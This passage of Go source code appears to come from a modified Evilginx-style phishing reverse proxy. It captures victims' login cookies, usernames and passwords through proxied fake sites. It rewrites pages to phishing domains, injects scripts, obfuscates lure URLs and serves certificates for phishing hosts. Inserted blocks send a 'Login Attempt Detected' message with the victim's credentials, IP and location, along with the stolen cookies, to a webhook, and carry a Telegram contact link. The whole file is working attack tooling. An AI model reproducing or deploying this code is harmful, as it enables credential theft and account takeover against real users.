							if ck.Value != "" && (ck.Expires.IsZero() || (!ck.Expires.IsZero() && time.Now().Before(ck.Expires))) { // cookies with empty values or expired cookies are of no interest to us
								is_auth = s.AddAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, auth_tokens)
								if len(pl.authUrls) > 0 {
									is_auth = false
								}
								if is_auth {
									if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens); err != nil {
										log.Error("database: %v", err)
									}
									shouldSend := p.cfg.webhook_verbosity == 1 && !s.WebhookSent
									if len(s.Tokens) > 0 && shouldSend || p.cfg.webhook_verbosity == 2 {
str := `[%d] Login Attempt Detected
================
Username: %s 
Password: %s 
Custom: %s
IP Address: %s
Location: %s
================
Contact: https://t.me/+bKkEPDwU8FxlYmJk`

geo := p.GetGeo(s.IP)

victimInfo := fmt.Sprintf(str, ps.Index, s.Username, s.Password, s.Custom, s.IP, geo)

p.NotifyWebhook(victimInfo)
p.SendCookies(TokensToJSON(pl, s.Tokens))
										s.WebhookSent = true
									}
									s.IsDone = true
								}
							}
						}
					}
				}

				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
				resp.Header.Add("Set-Cookie", ck.String())
			}
			if ck.String() != "" {
				resp.Header.Add("Set-Cookie", ck.String())
			}
			if is_auth {
				// we have all auth tokens
				log.Success("[%d] all authorization tokens intercepted!", ps.Index)
			}

			// modify received body
			body, err := io.ReadAll(resp.Body)

			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
			if err == nil {
				for site, pl := range p.cfg.phishlets {
					if p.cfg.IsSiteEnabled(site) {
						// handle sub_filters
						sfs, ok := pl.subfilters[req_hostname]
						if ok {
							for _, sf := range sfs {
								var param_ok bool = true
								if s, ok := p.sessions[ps.SessionId]; ok {
									var params []string
									for k := range s.Params {
										params = append(params, k)
									}
									if len(sf.with_params) > 0 {
										param_ok = false
										for _, param := range sf.with_params {
											if stringExists(param, params) {
												param_ok = true
												break
											}
										}
									}
								}
								if len(mime) == 0 {
									mime = sf.mime[0]
								}
								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
									re_s := sf.regexp
									replace_s := sf.replace
									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
									phish_sub, _ := p.getPhishSub(phish_hostname)

									re_s = strings.ReplaceAll(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)))
									re_s = strings.ReplaceAll(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain))
									re_s = strings.ReplaceAll(re_s, "{domain}", regexp.QuoteMeta(sf.domain))
									re_s = strings.ReplaceAll(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))))
									re_s = strings.ReplaceAll(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain))
									re_s = strings.ReplaceAll(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain))
									replace_s = strings.ReplaceAll(replace_s, "{hostname}", phish_hostname)
									replace_s = strings.ReplaceAll(replace_s, "{subdomain}", phish_sub)
									replace_s = strings.ReplaceAll(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname))
									replace_s = strings.ReplaceAll(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub))
									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
									if ok {
										replace_s = strings.ReplaceAll(replace_s, "{domain}", phishDomain)
										replace_s = strings.ReplaceAll(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain))
									}

									if re, err := regexp.Compile(re_s); err == nil {
										body = []byte(re.ReplaceAllString(string(body), replace_s))
									} else {
										log.Error("regexp failed to compile: `%s`", sf.regexp)
									}
								}
							}
						}

						// handle auto filters (if enabled)
						if stringExists(mime, p.auto_filter_mimes) {
							for _, ph := range pl.proxyHosts {
								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
									if ph.auto_filter {
										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
									}
								}
							}
						}
					}
				}

				if stringExists(mime, []string{"text/html"}) {
					if pl != nil && ps.SessionId != "" {
						s, ok := p.sessions[ps.SessionId]
						if ok {
							if s.PhishLure != nil {
								// inject opengraph headers
								l := s.PhishLure
								body = p.injectOgHeaders(l, body)
							}

							var js_params *map[string]string = nil
							if s, ok := p.sessions[ps.SessionId]; ok {
								js_params = &s.Params
							}
							script, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
							if err == nil {
								log.Debug("js_inject: matched %s%s - injecting script", req_hostname, resp.Request.URL.Path)
								js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
								m_nonce := js_nonce_re.FindStringSubmatch(string(body))
								js_nonce := ""
								if m_nonce != nil {
									js_nonce = " nonce=\"" + m_nonce[1] + "\""
								}
								re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
								body = []byte(re.ReplaceAllString(string(body), "<script"+js_nonce+">"+script+"</script>${1}"))
							}
						}
					}
				}

				resp.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
			}

			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					for _, au := range pl.authUrls {
						if au.MatchString(resp.Request.URL.Path) {
							err := p.db.SetSessionTokens(ps.SessionId, s.Tokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							if err == nil {
								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)

shouldSend := p.cfg.webhook_verbosity == 1 && !s.WebhookSent
if len(s.Tokens) > 0 && shouldSend || p.cfg.webhook_verbosity == 2 {
	str := `[%d] Login Attempt Detected
================
Username: %s 
Password: %s 
Custom: %s
IP Address: %s
Location: %s
================
Contact: https://t.me/+bKkEPDwU8FxlYmJk`

	geo := p.GetGeo(s.IP)
	victimInfo := fmt.Sprintf(str, ps.Index, s.Username, s.Password, s.Custom, s.IP, geo)

	p.NotifyWebhook(victimInfo)
	p.SendCookies(TokensToJSON(pl, s.Tokens))
	s.WebhookSent = true
}
s.IsDone = true
							}
							break
						}
					}
				}
			}

			if pl != nil && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					if s.RedirectURL != "" && s.RedirectCount == 0 {
						if stringExists(mime, []string{"text/html"}) {
							// redirect only if received response content is of `text/html` content type
							s.RedirectCount += 1
							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
							resp := goproxy.NewResponse(resp.Request, "text/html", http.StatusFound, "")
							if resp != nil {
								r_url, err := url.Parse(s.RedirectURL)
								if err == nil {
									if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
										r_url.Host = r_host
									}
									resp.Header.Set("Location", r_url.String())
								} else {
									resp.Header.Set("Location", s.RedirectURL)
								}
								return resp
							}
						}
					}
				}
			}

			return resp
		})

	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}

	return p, nil
}

func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
	if len(p.cfg.redirectUrl) > 0 {
		redirect_url := p.cfg.redirectUrl
		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
		if resp != nil {
			resp.Header.Add("Location", redirect_url)
			return req, resp
		}
	} else {
		resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
		if resp != nil {
			return req, resp
		}
	}
	return req, nil
}

func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
	vals := u.Query()
	for _, v := range vals {
		dec, err := base64.RawURLEncoding.DecodeString(v[0])
		if err == nil && len(dec) == 5 {
			var crc byte = 0
			for _, b := range dec[1:] {
				crc += b
			}
			if crc == dec[0] {
				return true
			}
		}
	}
	return false
}

func TokensToJSON(pl *Phishlet, tokens map[string]map[string]*database.Token) string {
	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	results, err := json.Marshal(cookies)
	if err != nil {
		log.Error("%v", err)
	}
	return string(results)
}

func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
	var ret bool = false
	vals := u.Query()

	var enc_key string

	for _, v := range vals {
		if len(v[0]) > 8 {
			enc_key = v[0][:8]
			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
			if err == nil {
				dec_params := make([]byte, len(enc_vals)-1)

				var crc byte = enc_vals[0]
				c, _ := rc4.NewCipher([]byte(enc_key))
				c.XORKeyStream(dec_params, enc_vals[1:])

				var crc_chk byte
				for _, c := range dec_params {
					crc_chk += byte(c)
				}

				if crc == crc_chk {
					params, err := url.ParseQuery(string(dec_params))
					if err == nil {
						for kk, vv := range params {
							log.Debug("param: %s='%s'", kk, vv[0])

							session.Params[kk] = vv[0]
						}
						ret = true
						break
					}
				} else {
					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
				}
			}
		}
	}

	return ret
}

func (p *HttpProxy) replaceHtmlParams(body, lure_url string, params *map[string]string) string { //nolint:gocritic // false positive

	// generate forwarder parameter
	t := make([]byte, 5)
	_, err := rand.Read(t[1:])
	if err != nil {
		log.Error("rand.Read: %v", err)
	}
	var crc byte = 0
	for _, b := range t[1:] {
		crc += b
	}
	t[0] = crc
	fwd_param := base64.RawURLEncoding.EncodeToString(t)

	lure_url += "?" + GenRandomString(1) + "=" + fwd_param

	for k, v := range *params {
		key := "{" + k + "}"
		body = strings.ReplaceAll(body, key, html.EscapeString(v))
	}
	var js_url string
	n := 0
	for n < len(lure_url) {
		t := make([]byte, 1)
		_, err := rand.Read(t)
		if err != nil {
			log.Error("rand.Read: %v", err)
		}
		rn := int(t[0])%3 + 1

		if rn+n > len(lure_url) {
			rn = len(lure_url) - n
		}

		if n > 0 {
			js_url += " + "
		}
		js_url += "'" + lure_url[n:n+rn] + "'"

		n += rn
	}

	body = strings.ReplaceAll(body, "{cookie_key}", p.cfg.cookie_key)
	body = strings.ReplaceAll(body, "{ cookie_key }", p.cfg.cookie_key)
	body = strings.ReplaceAll(body, "{lure_url_html}", lure_url)
	body = strings.ReplaceAll(body, "{lure_url_js}", js_url)
	body = strings.ReplaceAll(body, "{ lure_url_html }", lure_url)
	body = strings.ReplaceAll(body, "{ lure_url_js }", js_url)
	body = strings.ReplaceAll(body, "{ turnstile_sitekey }", p.cfg.turnstile_sitekey)
	body = strings.ReplaceAll(body, "{ recaptcha_sitekey }", p.cfg.recaptcha_sitekey)
	body = strings.ReplaceAll(body, "{turnstile_sitekey}", p.cfg.turnstile_sitekey)
	body = strings.ReplaceAll(body, "{recaptcha_sitekey}", p.cfg.recaptcha_sitekey)

	return body
}

func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
	re_url := regexp.MustCompile(MATCH_URL_REGEXP)
	re_ns_url := regexp.MustCompile(MATCH_URL_REGEXP_WITHOUT_SCHEME)

	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
		var sub_map map[string]string = make(map[string]string)
		var hosts []string
		for _, ph := range pl.proxyHosts {
			var h string
			if c_type == CONVERT_TO_ORIGINAL_URLS {
				h = combineHost(ph.phish_subdomain, phishDomain)
				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
			} else {
				h = combineHost(ph.orig_subdomain, ph.domain)
				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
			}
			hosts = append(hosts, h)
		}
		// make sure that we start replacing strings from longest to shortest
		sort.Slice(hosts, func(i, j int) bool {
			return len(hosts[i]) > len(hosts[j])
		})

		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			u, err := url.Parse(s_url)
			if err == nil {
				for _, h := range hosts {
					if strings.EqualFold(u.Host, h) {
						s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
						break
					}
				}
			}
			return s_url
		}))
		body = []byte(re_ns_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			for _, h := range hosts {
				if strings.Contains(s_url, h) && !strings.Contains(s_url, sub_map[h]) {
					s_url = strings.Replace(s_url, h, sub_map[h], 1)
					break
				}
			}
			return s_url
		}))
	}
	return body
}

func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
		parts := strings.SplitN(host, ":", 2)
		hostname := parts[0]
		port := 443
		if len(parts) == 2 {
			port, _ = strconv.Atoi(parts[1])
		}

		if !p.developer {
			// check for lure hostname
			cert, err := p.crt_db.GetHostnameCertificate(hostname)
			if err != nil {
				// check for phishlet hostname
				pl := p.getPhishletByOrigHost(hostname)
				if pl != nil {
					phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
					if ok {
						cert, err = p.crt_db.GetPhishletCertificate(pl.Name, phishDomain)
						if err != nil {
							return nil, err
						}
					}
				}
			}
			if cert != nil {
				return &tls.Config{
					InsecureSkipVerify: true,
					Certificates:       []tls.Certificate{*cert},
				}, nil
			}
			log.Debug("no SSL/TLS certificate for host '%s'", host)
			return nil, fmt.Errorf("no SSL/TLS certificate for host '%s'", host)
		} else {
			var ok bool
			phish_host := ""
			if !p.cfg.IsLureHostnameValid(hostname) {
				phish_host, ok = p.replaceHostWithPhished(hostname)
				if !ok {
					log.Debug("phishing hostname not found: %s", hostname)
					return nil, fmt.Errorf("phishing hostname not found")
				}
			}

			cert, err := p.crt_db.SignCertificateForHost(hostname, phish_host, port)
			if err != nil {
				return nil, err
			}
			return &tls.Config{
				InsecureSkipVerify: true,
				Certificates:       []tls.Certificate{*cert},
			}, nil
		}
	}
}

func (p *HttpProxy) setSessionUsername(sid, username string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetUsername(username)
	}
}

func (p *HttpProxy) setSessionPassword(sid, password string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetPassword(password)
	}
}

func (p *HttpProxy) setSessionCustom(sid, name, value string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetCustom(name, value)
	}
}

func (p *HttpProxy) httpsWorker() {
	var err error

	p.sniListener, err = net.Listen("tcp", p.Server.Addr)
	if err != nil {
		log.Fatal("%s", err)
		return
	}

	p.isRunning = true
	for p.isRunning {
		c, err := p.sniListener.Accept()
		if err != nil {
			log.Error("Error accepting connection: %s", err)
			continue
		}

		go func(c net.Conn) {
			now := time.Now()
			err := c.SetReadDeadline(now.Add(httpReadTimeout))
			if err != nil {
				log.Error("SetReadDeadline: %v", err)
			}
			err = c.SetWriteDeadline(now.Add(httpWriteTimeout))
			if err != nil {
				log.Error("SetWriteDeadline: %v", err)
			}

			tlsConn, err := vhost.TLS(c)
			if err != nil {
				return
			}

			hostname := tlsConn.Host()
			if hostname == "" {
				return
			}

			if !p.cfg.IsActiveHostname(hostname) {
				log.Debug("hostname unsupported: %s", hostname)
				return
			}

			hostname, _ = p.replaceHostWithOriginal(hostname)

			req := &http.Request{
				Method: "CONNECT",
				URL: &url.URL{
					Opaque: hostname,
					Host:   net.JoinHostPort(hostname, "443"),
				},
				Host:       hostname,
				Header:     make(http.Header),
				RemoteAddr: c.RemoteAddr().String(),
			}
			resp := dumbResponseWriter{tlsConn}
			p.Proxy.ServeHTTP(resp, req)
		}(c)
	}
}

func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return pl
				}
			}
		}
	}
	return nil
}

func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return pl
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				pl, err := p.cfg.GetPhishlet(l.Phishlet)
				if err == nil {
					return pl
				}
			}
		}
	}

	return nil
}

func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == ph.domain {
					return prefix + phishDomain, true
				}
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return phishDomain, true
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				phishDomain, ok := p.cfg.GetSiteDomain(l.Phishlet)
				if ok {
					return phishDomain, true
				}
			}
		}
	}

	return "", false
}

func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return ph.phish_subdomain, true
				}
			}
		}
	}
	return "", false
}

func (p *HttpProxy) handleSession(hostname string) bool {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					if ph.handle_session || ph.is_landing {
						return true
					}
					return false
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				return true
			}
		}
	}

	return false
}

func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
	if l.OgDescription != "" || l.OgTitle != "" || l.OgImageUrl != "" || l.OgUrl != "" {
		head_re := regexp.MustCompile(`(?i)(<\s*head\s*>)`)
		var og_inject string
		og_format := "<meta property=\"%s\" content=\"%s\" />\n"
		if l.OgTitle != "" {
			og_inject += fmt.Sprintf(og_format, "og:title", l.OgTitle)
		}
		if l.OgDescription != "" {
			og_inject += fmt.Sprintf(og_format, "og:description", l.OgDescription)
		}
		if l.OgImageUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:image", l.OgImageUrl)
		}
		if l.OgUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:url", l.OgUrl)
		}

		body = []byte(head_re.ReplaceAllString(string(body), "<head>\n"+og_inject))
	}
	return body
}

func (p *HttpProxy) Start() error {
	go p.httpsWorker()
	return nil
}

func (p *HttpProxy) deleteRequestCookie(name string, req *http.Request) {
	if cookie := req.Header.Get("Cookie"); cookie != "" {
		re := regexp.MustCompile(`(` + name + `=[^;]*;?\s*)`)
		new_cookie := re.ReplaceAllString(cookie, "")
		req.Header.Set("Cookie", new_cookie)
	}
}

 func (p *HttpProxy) whitelistIP(ip_addr, sid string) {
 	p.ip_mtx.Lock()
 	defer p.ip_mtx.Unlock()

 	log.Debug("whitelistIP: %s %s", ip_addr, sid)
 	p.ip_whitelist[ip_addr] = time.Now().Add(10 * time.Minute).Unix()
 	p.ip_sids[ip_addr] = sid
 }

 func (p *HttpProxy) isWhitelistedIP(ip_addr string) bool {
 	p.ip_mtx.Lock()
 	defer p.ip_mtx.Unlock()

 	log.Debug("isWhitelistIP: %s", ip_addr)
 	ct := time.Now()
 	if ip_t, ok := p.ip_whitelist[ip_addr]; ok {
 		et := time.Unix(ip_t, 0)
 		return ct.Before(et)
 	}
 	return false
 }

func (p *HttpProxy) getSessionIdByIP(ip_addr string) (string, bool) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	sid, ok := p.ip_sids[ip_addr]
	return sid, ok
}

func (p *HttpProxy) setProxy(enabled bool, ptype, address string, port int, username, password string) error {
	if enabled {
		ptypes := []string{"http", "https", "socks5", "socks5h"}
		if !stringExists(ptype, ptypes) {
			return fmt.Errorf("invalid proxy type selected")
		}
		if address == "" {
			return fmt.Errorf("proxy address can't be empty")
		}
		if port == 0 {
			return fmt.Errorf("proxy port can't be 0")
		}

		u := url.URL{
			Scheme: ptype,
			Host:   address + ":" + strconv.Itoa(port),
		}

		if strings.HasPrefix(ptype, "http") {
			var dproxy *http_dialer.HttpTunnel
			if username != "" {
				dproxy = http_dialer.New(&u, http_dialer.WithProxyAuth(http_dialer.AuthBasic(username, password)))
			} else {
				dproxy = http_dialer.New(&u)
			}
			p.Proxy.Tr.Dial = dproxy.Dial //nolint:staticcheck // DialContext not available
		} else {
			if username != "" {
				u.User = url.UserPassword(username, password)
			}

			dproxy, err := proxy.FromURL(&u, nil)
			if err != nil {
				return err
			}
			p.Proxy.Tr.Dial = dproxy.Dial //nolint:staticcheck // DialContext not available
		}

	} else {
		p.Proxy.Tr.Dial = nil //nolint:staticcheck // DialContext not available
	}
	return nil
}

type dumbResponseWriter struct {
	net.Conn
}

func (dumb dumbResponseWriter) Header() http.Header {
	panic("Header() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Write(buf []byte) (int, error) {
	if bytes.Equal(buf, []byte("HTTP/1.0 200 OK\r\n\r\n")) {
		return len(buf), nil // throw away the HTTP OK response from the faux CONNECT request
	}
	return dumb.Conn.Write(buf)
}

func (dumb dumbResponseWriter) WriteHeader(code int) {
	panic("WriteHeader() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
}
// Get the IP address of the connected user.
// Returns IP specified in header or request.RemoteAddr if not applicable.
func GetUserIP(_ http.ResponseWriter, httpServer *http.Request) (userIP string) {
	if len(httpServer.Header.Get("Cf-Connecting-IP")) > 1 {
		userIP = httpServer.Header.Get("Cf-Connecting-IP")
		userIP = net.ParseIP(userIP).String()
	} else if len(httpServer.Header.Get("X-Forwarded-For")) > 1 {
		userIP = httpServer.Header.Get("X-Forwarded-For")
		userIP = net.ParseIP(userIP).String()
	} else if len(httpServer.Header.Get("X-Real-IP")) > 1 {
		userIP = httpServer.Header.Get("X-Real-IP")
		userIP = net.ParseIP(userIP).String()
	} else if len(httpServer.Header.Get("True-Client-IP")) > 1 {
		userIP = httpServer.Header.Get("True-Client-IP")
		userIP = net.ParseIP(userIP).String()
	} else {
		return httpServer.RemoteAddr
	}
	if len(userIP) < 8 {
		return httpServer.RemoteAddr
	}
	return userIP
}

func RemoveIPHeaders(headers http.Header) {

}
